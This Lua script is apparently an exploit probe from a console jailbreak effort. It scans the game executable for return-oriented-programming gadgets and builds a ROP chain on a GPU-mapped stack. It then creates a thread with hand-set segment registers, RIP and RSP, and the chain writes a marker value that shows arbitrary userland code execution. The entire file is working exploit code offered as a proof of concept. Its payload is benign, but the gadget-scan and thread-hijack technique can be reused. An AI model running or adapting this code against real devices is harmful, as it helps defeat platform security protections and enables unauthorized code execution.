-- CRASH_CLASS: HIGH
-- PROBE 80b: Thread ROP chain — prove controlled execution via thr_create
--
-- Context: 80a confirmed CS=0x43/SS=0x3B prevents kernel panic and threads
-- execute with our RIP/RSP. This probe builds a ROP chain on a GPU mmap stack
-- that writes a marker value to shared memory, proving arbitrary gadget execution.
--
-- Strategy:
--   1. Scan eboot for needed gadgets (pop rdi;ret, pop rsi;ret, etc.)
--   2. Build a ROP chain on GPU mmap stack
--   3. Create thread with RIP=first gadget, RSP=chain start
--   4. Chain writes 0xDEADBEEF to a shared dword, then calls thr_exit
--   5. Main thread sleeps briefly, then checks the marker
--
-- If the marker is written: we have ARBITRARY CODE EXECUTION in userland via ROP.

print("=== PROBE 80b: THREAD ROP CHAIN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
print("[*] canary pid=" .. tostring(syscall.sc_getpid():tonumber()))

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[*] eboot base=" .. q(eboot))

-- ============================================================
-- STEP 1: Gadget scan in eboot .text (RX, readable)
-- ============================================================
print("")
print("[1] Scanning eboot for ROP gadgets...")

local gadgets = {}

local function scan_for(name, bytes, max_off)
    max_off = max_off or 0x80000
    local len = #bytes
    for off = 0, max_off - len do
        local match = true
        for i = 1, len do
            local b = rb(eboot + off + (i - 1))
            if b ~= bytes[i] then match = false break end
        end
        if match then
            gadgets[name] = eboot + off
            print("  " .. name .. " = eboot+" .. string.format("0x%X", off) .. " = " .. q(eboot + off))
            return true
        end
    end
    print("  " .. name .. " = NOT FOUND")
    return false
end

-- Scan 512KB for common gadgets
local SCAN = 0x80000
-- pop rdi; ret = 5F C3
scan_for("pop_rdi_ret", {0x5F, 0xC3}, SCAN)
-- pop rsi; ret = 5E C3
scan_for("pop_rsi_ret", {0x5E, 0xC3}, SCAN)
-- pop rdx; ret = 5A C3
scan_for("pop_rdx_ret", {0x5A, 0xC3}, SCAN)
-- pop rax; ret = 58 C3
scan_for("pop_rax_ret", {0x58, 0xC3}, SCAN)
-- pop rcx; ret = 59 C3
scan_for("pop_rcx_ret", {0x59, 0xC3}, SCAN)
-- pop rbp; ret = 5D C3
scan_for("pop_rbp_ret", {0x5D, 0xC3}, SCAN)
-- ret = C3
scan_for("ret", {0xC3}, SCAN)
-- syscall; ret = 0F 05 C3
scan_for("syscall_ret", {0x0F, 0x05, 0xC3}, SCAN)
-- mov [rsi], rax; ret = 48 89 06 C3
scan_for("mov_rsi_rax_ret", {0x48, 0x89, 0x06, 0xC3}, SCAN)
-- mov [rsi], eax; ret = 89 06 C3
scan_for("mov_rsi_eax_ret", {0x89, 0x06, 0xC3}, SCAN)
-- mov [rdi], eax; ret = 89 07 C3
scan_for("mov_rdi_eax_ret", {0x89, 0x07, 0xC3}, SCAN)
-- mov [rdi], rax; ret = 48 89 07 C3
scan_for("mov_rdi_rax_ret", {0x48, 0x89, 0x07, 0xC3}, SCAN)
-- mov [rcx], eax; ret = 89 01 C3
scan_for("mov_rcx_eax_ret", {0x89, 0x01, 0xC3}, SCAN)
-- mov [rcx], rax; ret = 48 89 01 C3
scan_for("mov_rcx_rax_ret", {0x48, 0x89, 0x01, 0xC3}, SCAN)
-- xor eax, eax; ret = 31 C0 C3
scan_for("xor_eax_ret", {0x31, 0xC0, 0xC3}, SCAN)
-- Also scan further for pop rdi;ret (it's critical)
if not gadgets.pop_rdi_ret then
    print("  Extending scan for pop_rdi_ret to 1MB...")
    scan_for("pop_rdi_ret", {0x5F, 0xC3}, 0x100000)
end
-- REX.W pop rdi; ret = 41 5F C3 (pop r15; ret — close enough for some uses)
if not gadgets.pop_rdi_ret then
    scan_for("pop_r15_ret", {0x41, 0x5F, 0xC3}, SCAN)
end

print("")

-- Check we have minimum viable gadgets for a write
local have_write = false
if gadgets.pop_rdi_ret and gadgets.pop_rax_ret and (gadgets.mov_rdi_eax_ret or gadgets.mov_rdi_rax_ret) then
    have_write = true
    print("[+] Write strategy: pop_rdi + pop_rax + mov [rdi],eax/rax")
elseif gadgets.pop_rsi_ret and gadgets.pop_rax_ret and (gadgets.mov_rsi_eax_ret or gadgets.mov_rsi_rax_ret) then
    have_write = true
    print("[+] Write strategy: pop_rsi + pop_rax + mov [rsi],eax/rax")
elseif gadgets.pop_rcx_ret and gadgets.pop_rax_ret and (gadgets.mov_rcx_eax_ret or gadgets.mov_rcx_rax_ret) then
    have_write = true
    print("[+] Write strategy: pop_rcx + pop_rax + mov [rcx],eax/rax")
elseif gadgets.pop_rax_ret and gadgets.syscall_ret then
    have_write = true
    print("[+] Write strategy: syscall (getpid as proof)")
else
    print("[!] No direct write gadget found. Using stack-modification proof instead.")
end

-- ============================================================
-- STEP 2: Build ROP chain on GPU mmap stack
-- ============================================================
print("[2] Building ROP chain...")

-- Allocate shared marker
local marker = memory.alloc(16)
zero(marker, 16)
wd(marker, 0)      -- will be overwritten by thread
wd(marker + 4, 0)
print("  marker addr=" .. q(marker) .. " initial=" .. string.format("0x%X", rd(marker) or 0))

-- Allocate stack via GPU mmap
local sc_mmap = make_syscall(477)
local stack_ok, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("  stack mmap: ok=" .. tostring(stack_ok) .. " base=" .. q(stack_base))
if not stack_ok then
    print("[!] FATAL: stack mmap failed")
    print("=== PROBE 80b COMPLETE ===")
    return
end

-- Zero the stack area
local stack_top = stack_base + (15 * 0x4000)  -- top of mmap region
for off = 0, 0x1000 - 4, 4 do
    wd(stack_top + off, 0)
end

-- Build chain at stack_top + 0x800 (middle of page, plenty of room)
local chain = stack_top + 0x800
local pos = 0

local function push_q(val)
    wq(chain + pos, val)
    pos = pos + 8
end

-- Select best write strategy based on available gadgets
local pop_addr = nil   -- gadget to pop target address register
local pop_val = gadgets.pop_rax_ret  -- gadget to pop value into rax
local write_g = nil    -- gadget to write [addr_reg] = eax/rax
local strategy = "none"

if gadgets.pop_rdi_ret and pop_val and gadgets.mov_rdi_eax_ret then
    pop_addr = gadgets.pop_rdi_ret; write_g = gadgets.mov_rdi_eax_ret; strategy = "rdi_eax"
elseif gadgets.pop_rdi_ret and pop_val and gadgets.mov_rdi_rax_ret then
    pop_addr = gadgets.pop_rdi_ret; write_g = gadgets.mov_rdi_rax_ret; strategy = "rdi_rax"
elseif gadgets.pop_rsi_ret and pop_val and gadgets.mov_rsi_eax_ret then
    pop_addr = gadgets.pop_rsi_ret; write_g = gadgets.mov_rsi_eax_ret; strategy = "rsi_eax"
elseif gadgets.pop_rsi_ret and pop_val and gadgets.mov_rsi_rax_ret then
    pop_addr = gadgets.pop_rsi_ret; write_g = gadgets.mov_rsi_rax_ret; strategy = "rsi_rax"
elseif gadgets.pop_rcx_ret and pop_val and gadgets.mov_rcx_eax_ret then
    pop_addr = gadgets.pop_rcx_ret; write_g = gadgets.mov_rcx_eax_ret; strategy = "rcx_eax"
elseif gadgets.pop_rcx_ret and pop_val and gadgets.mov_rcx_rax_ret then
    pop_addr = gadgets.pop_rcx_ret; write_g = gadgets.mov_rcx_rax_ret; strategy = "rcx_rax"
end

if pop_addr and pop_val and write_g then
    print("  Strategy: " .. strategy)
    push_q(pop_addr)                    -- pop addr_reg; ret
    push_q(marker)                      -- addr_reg = marker
    push_q(pop_val)                     -- pop rax; ret
    push_q(uint64(0xDEADBEEF))         -- rax = 0xDEADBEEF
    push_q(write_g)                     -- mov [addr_reg], eax/rax; ret
    push_q(uint64(0))                   -- crash cleanly
    print("  chain: " .. (pos/8) .. " slots")
else
    -- No write gadget found — use stack canary proof
    -- Write known values on stack, thread pops through them (ret sled),
    -- and we check if the values were consumed (zeroed by stack pops)
    print("  Strategy: stack-canary proof (no write gadget)")
    -- Write 0xCAFEBABE pattern, then ret sled, then 0
    -- If thread executes, ret pops consume these entries
    local canary_off = pos
    for i = 0, 7 do
        push_q(gadgets.ret)              -- ret sled
    end
    -- After ret sled, write a second canary pattern that should NOT be consumed
    local end_canary_off = pos
    push_q(uint64(0xCAFEBABE))          -- this should remain if chain length is right
    push_q(uint64(0))                   -- final crash
    print("  chain: " .. (pos/8) .. " slots, canary at +" .. string.format("%02X", end_canary_off))
end

-- Dump chain for verification
print("  chain dump:")
for off = 0, pos - 8, 8 do
    local val = rq(chain + off)
    print("    +" .. string.format("%02X", off) .. ": " .. q(val))
end

-- ============================================================
-- STEP 3: Create thread
-- ============================================================
print("")
print("[3] Creating thread with ROP chain...")

local MC_OFFSET = 0x10
local USER_CS = 0x43
local USER_SS = 0x3B
local USER_RFLAGS = 0x202

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)

-- Segment registers (THE FIX)
wq(ctx + MC_OFFSET + 0x88, uint64(USER_CS))      -- CS = 0x43
wq(ctx + MC_OFFSET + 0xA0, uint64(USER_SS))      -- SS = 0x3B
wq(ctx + MC_OFFSET + 0x90, uint64(USER_RFLAGS))  -- RFLAGS = 0x202
wq(ctx + MC_OFFSET + 0x108, uint64(0x480))        -- mc_len

-- RIP = first gadget (ret), RSP = chain start
-- The ret at RIP will pop the first chain entry
wq(ctx + MC_OFFSET + 0x80, gadgets.ret)            -- RIP = ret gadget
wq(ctx + MC_OFFSET + 0x98, chain)                  -- RSP = chain start

-- Pre-load registers for strategies that need them
if gadgets.mov_rdi_eax_ret or gadgets.mov_rdi_rax_ret then
    -- RDI and RAX will be set by pop gadgets in the chain
elseif gadgets.syscall_ret then
    -- RAX will be set by pop gadget
end

print("  RIP=" .. q(gadgets.ret))
print("  RSP=" .. q(chain))

local new_tid = memory.alloc(8)
zero(new_tid, 8)

local ok_call, rv = pcall(function()
    local sc = make_syscall(430)
    return sc(uint64(ctx), uint64(new_tid), uint64(0))
end)
print("  thr_create: ok=" .. tostring(ok_call) .. " rv=" .. tostring(rv))
local tid_val = rq(new_tid)
print("  tid=" .. q(tid_val))

-- ============================================================
-- STEP 4: Wait and check marker
-- ============================================================
print("")
print("[4] Waiting for thread execution...")

-- Brief busy-wait (~100ms worth of iterations)
local dummy = 0
for i = 1, 500000 do dummy = dummy + 1 end

local marker_after = rd(marker)
print("  marker value after wait: 0x" .. string.format("%08X", marker_after or 0))

if marker_after == 0xDEADBEEF then
    print("")
    print("  *** MARKER WRITTEN! THREAD ROP CHAIN EXECUTED SUCCESSFULLY! ***")
    print("  *** WE HAVE ARBITRARY USERLAND CODE EXECUTION VIA ROP! ***")
else
    print("  marker not written (0x" .. string.format("%08X", marker_after or 0) .. ")")
    print("  possible causes: timing, gadget issue, or chain didn't execute")

    -- Check if stack was modified (weaker evidence of execution)
    print("")
    print("  stack state check:")
    for off = 0, pos + 16, 8 do
        local val = rq(chain + off)
        print("    chain+" .. string.format("%02X", off) .. ": " .. q(val))
    end
end

-- Wait more and recheck
for i = 1, 2000000 do dummy = dummy + 1 end
local marker_after2 = rd(marker)
print("  marker recheck: 0x" .. string.format("%08X", marker_after2 or 0))
if marker_after2 == 0xDEADBEEF then
    print("  *** DELAYED SUCCESS — THREAD WROTE MARKER! ***")
end

-- Canary
local alive_ok, alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[5] canary: ok=" .. tostring(alive_ok) .. " pid=" .. tostring(alive))
print("=== PROBE 80b COMPLETE ===")
